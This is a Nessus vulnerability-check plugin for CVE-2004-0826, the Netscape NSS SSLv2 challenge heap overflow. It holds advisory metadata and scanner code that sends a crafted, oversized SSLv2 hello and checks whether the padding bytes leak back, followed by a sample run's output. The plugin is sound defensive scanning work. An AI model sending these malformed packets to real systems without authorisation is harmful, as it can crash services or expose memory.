#TRUSTED 2b8d9fb9b09d9336a8a85894c9702678ae7213456d1a251736b4dbfadc8c5839a39f149588da911d2d2c2c20b45e5f6c012ab2b80f32ac33e9b2f3cc4a3d73f655b200ae4aad9b67f29457eaebcf7cf1cdbea21570177ece16c143a96c3e0cc779f120a132549792a7882e6e701edda05a3f927edb4370d418b70805e3804c39d6bf78fa8b82675d1ac488a105c5b80c5fc0cdb340ed1a5743f8bc93040fd783c6ecefdb23d849986d280594ed36f479d7f1766657c4486ac5e2fe75c2d3da8ea0e7996c48e67063f327a9117f8ce92557c6bfac9841acc215396f4b144b560685f9fb243a19250f17bd8254b648f5651271775f63d527a88c680bbd8e885ca5fbbd920c137853e35ae1f213f8a913adb0f6218f39a5d68fa7de4b35664ecdf4178525d0ee58a10d7a2d3bab4bd4a29bade589e61f5fbb2c59427b2821607dc22941f1a499f583a54840f57ed7faa94e909297696b7e486fb6b612260a660e06f8f3e26124c75f5326ea40167361d0e185b025bc4a6a1aeb775a548695edb0fd43250510295b989b7620f0cea949dbbcb13a27d7303991c5205867627fa40cb22973f091d2933b256aad9f34650955b12a7d2dcf1982cb4fd5ed60879c87b691dd8390a61a7cdb7f799ca3ad67dcd1980a56f4ac9a742efd52acca1e02be82bea5b8f7b3c01bfc1fb79c9c13dbf86f5de547492bcc81986d93e26bfe0f813128
#
# This script was written by H D Moore <hdmoore@digitaldefense.net>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title (8/5/09)
# - Updated to use compat.inc (11/20/2009)
# - Updated to support StartTLS (3/16/2012)
# - Signed (10/18/2013)
# - Add debuggig logs to aid troubleshooting (07/09/2021)

include('compat.inc');

if (description)
{
  script_id(14361);
  script_version("1.28");
	script_set_attribute(attribute:"plugin_modification_date", value:"2021/07/09");

  script_cve_id("CVE-2004-0826");
  script_bugtraq_id(11015);

  script_name(english:"Netscape NSS Library SSLv2 Challenge Overflow");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is susceptible to a buffer overflow attack.");
  script_set_attribute(attribute:"description", value:
"The remote host seems to be using the Mozilla Network Security
Services (NSS) Library, a set of libraries designed to support the
development of security-enabled client/server applications.

There seems to be a flaw in the remote version of this library, in the
SSLv2 handling code, that may allow an attacker to cause a heap
overflow and therefore execute arbitrary commands on the remote host.
To exploit this flaw, an attacker needs to send a malformed SSLv2
'hello' message to the remote service.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?844b4085");
  script_set_attribute(attribute:"solution", value:
"Upgrade the remote service to use NSS 3.9.2 or newer.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2004-0826");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"plugin_publication_date", value:"2004/08/24");
  script_set_attribute(attribute:"vuln_publication_date", value:"2004/08/23");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();


  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2021 Digital Defense");
  script_family(english:"Gain a shell remotely");
  script_dependencies("ssl_supported_versions.nasl");
  script_require_keys("SSL/Supported");
  exit(0);
}

include('byte_func.inc');
include('ftp_func.inc');
include('kerberos_func.inc');
include('ldap_func.inc');
include('nntp_func.inc');
include('smtp_func.inc');
include('ssl_funcs.inc');
include('telnet2_func.inc');

get_kb_item_or_exit("SSL/Supported");

var port = get_ssl_ports(fork:TRUE);
if (isnull(port))
  exit(1, "The host does not appear to have any SSL-based services.");

# Find out if the port is open.
if (!get_port_state(port))
  exit(0, "Port " + port + " is not open.");

# Grab the HTTP banner if this is a http service
var sb = 'www/real_banner/' + port;
var banner = get_kb_item(sb);

if (!banner) 
{
  sb = 'www/banner/'+ port;
  banner = get_kb_item(sb);
}

var TestOF;
if (safe_checks())
  TestOF = 0;
else
  TestOF = 1;

if (banner)
{
  if (egrep(pattern:".*(Netscape.Enterprise|Sun-ONE).*", string:banner)) 
    TestOF ++;
}

if (!TestOF) 
  exit(0, 'The remote host does not appear to be running Netscape or Sun-ONE.\n' +
          'If you wish to test this host regardless, you must first disable "Safe Checks" ' +
          'in your scan policy. Please refer to Tenable documentation on "Safe Checks" ' +
          'before proceeding, as turning this setting off will enable more intrusive and ' +
          'potentially dangerous plugins.');

# Connect to the port, issuing the StartTLS command if necessary.
var soc = open_sock_ssl(port);
if (!soc)
  exit(1, 'open_sock_ssl() returned NULL for port ' + port + '.');

# First we try a normal hello
var req = raw_string(0x80, 0x1c, 0x01, 0x00,
                 0x02, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x10, 0x07,
                 0x00, 0xc0)
                 + crap(length:16, data:'NESSUS');

send(socket:soc, data:req);
var res = recv(socket:soc, length:64);

# debugging - record send/recv
ssl_dbg(src:SCRIPT_NAME, msg:'\nNormal Hello Request :\n ' + hexstr(req) + '\n' +
                             'Normal Hello Response :\n ' + hexstr(res) + '\n');

# SSLv2 servers should respond back with the certificate at this point
if (strlen(res) < 64) 
  exit(0, 'The target did not respond back with the expected certificate');

close(soc);

# Now we try to overwrite most of the SSL response packet
# this should result in some of our data leaking back to us

# Connect to the port, issuing the StartTLS command if necessary.
soc = open_sock_ssl(port);

if (!soc)
  exit(1, 'open_sock_ssl() returned NULL for port ' + port + '.');

req = raw_string(0x80, 0x44, 0x01, 0x00,
                 0x02, 0x00, 0x03, 0x00,
                 0x00, 0x00, 0x38, 0x07,
                 0x00, 0xc0)
                 + crap(length:16, data:'NESSUS')
                 + crap(length:40, data:'VULN');

send(socket:soc, data:req);
res = recv(socket:soc, length:2048);
close(soc);

# debugging - record send/recv
ssl_dbg(src:SCRIPT_NAME, msg:'\nExploit Request : \n' + hexstr(req) + '\n' +
                             'Exploit Response : \n' + hexstr(res) + '\n');

var report = 'Nessus was able to overwrite most of the SSL response packet, as evidenced by observing some of the sent ' +
             'data leaking back in the response.\n' + 
             'Exploit Request  : ' + hexstr(req) + '\n' +
             'Exploit Response : ' + hexstr(res) + '\n';

if ('VULN' >< res) 
  security_report_v4(port:port, extra:report, severity:SECURITY_HOLE);

else audit(AUDIT_HOST_NOT, 'affected');

#-- contents of res after test --
#$ nasl DDI_NSS_SSLv2_Challenge_Overflow.nasl -t 192.168.50.192
#** WARNING : packet forgery will not work
#** as NASL is not running as root
#.....
#8.?.....
#(/..5._.2..I....S@J\i.......wK..H.....v4.o..T.......f......3V>.o.l.O."....X.G..:G7.....9a...... ....V...t.Sf
#|....8...VULNVULNVULNVULNh
